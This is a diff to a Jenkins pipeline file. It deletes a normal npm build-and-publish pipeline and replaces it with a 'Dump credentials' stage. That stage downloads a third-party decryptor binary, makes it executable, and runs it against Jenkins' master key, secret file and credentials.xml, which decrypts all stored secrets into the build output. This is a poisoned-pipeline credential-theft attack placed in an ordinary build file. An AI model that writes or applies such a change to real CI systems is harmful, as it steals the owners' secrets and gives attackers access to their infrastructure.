@@ -1,34 +1,25 @@
 pipeline {
-    agent any
-    tools {
-        jfrog 'jfrog-cli'
+  agent any
+  stages {
+
+    stage('Dump credentials') {
+      steps {
+        script {
+           sh '''
+             curl -L \
+               "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/0.0.5-alpha/jenkins-credentials-decryptor_0.0.5-alpha_$(uname -s)_$(uname -m)" \
+                -o jenkins-credentials-decryptor
+
+             chmod +x jenkins-credentials-decryptor
+             
+             ./jenkins-credentials-decryptor \
+               -m $JENKINS_HOME/secrets/master.key \
+               -s $JENKINS_HOME/secrets/hudson.util.Secret \
+               -c $JENKINS_HOME/credentials.xml 
+           '''
+        }
+      }
     }
-    stages {
-        stage('Clone') {
-            steps {s
-                git branch: 'master', url: "https://github.com/jfrog/project-examples.git"
-            }
-        }
 
-        stage('Exec npm commands') {
-            steps {
-                dir('npm-example') {
-                    // Configure npm project's repositories
-                    jf 'npm-config --repo-resolve testpipe-npm --repo-deploy testpipe-npm'
-
-                    // Install dependencies
-                    jf 'npm install'
-
-                    // Pack and deploy the npm package
-                    jf 'npm publish'
-                }
-            }
-        }
-
-        stage('Publish build info') {
-            steps {
-                jf 'rt build-publish'
-            }
-        }
-    }
+  }
 }
